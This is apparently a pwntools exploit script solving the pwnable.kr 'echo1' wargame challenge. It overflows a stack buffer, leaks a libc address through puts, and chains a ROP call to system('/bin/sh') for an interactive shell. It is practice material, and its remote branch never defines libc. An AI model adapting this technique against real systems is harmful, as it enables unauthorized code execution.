#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = ELF("./echo1")
if sys.argv[1] == "l":
    context.log_level = "debug"
    # env = {'LD_PRELOAD': ''}
    # io = process("", env = env)
    io = process("./echo1")
    libc = elf.libc


else:
    io = remote("pwnable.kr", 9010)
    #  libc = ELF("")


def DEBUG(cmd = ""):
    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

if __name__ == "__main__":
    pppr = asm('pop rdi;ret')
    io.sendlineafter(" : ", pppr)
    #  DEBUG("b *echo1\nc")
    io.sendlineafter("> ", "1")
    payload = flat([cyclic(0x20 + 8), elf.sym['id'], elf.got['puts'], elf.plt['puts']], elf.sym['echo1'])
    io.sendline(payload)
    libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - libc.sym['puts']
    success("libc.address -> {:#x}".format(libc.address))
    pause()

    payload = flat([cyclic(0x20 + 8), elf.sym['id'], next(libc.search("/bin/sh")), libc.sym['system']])
    io.sendline(payload)
    
    io.interactive()
    io.close()



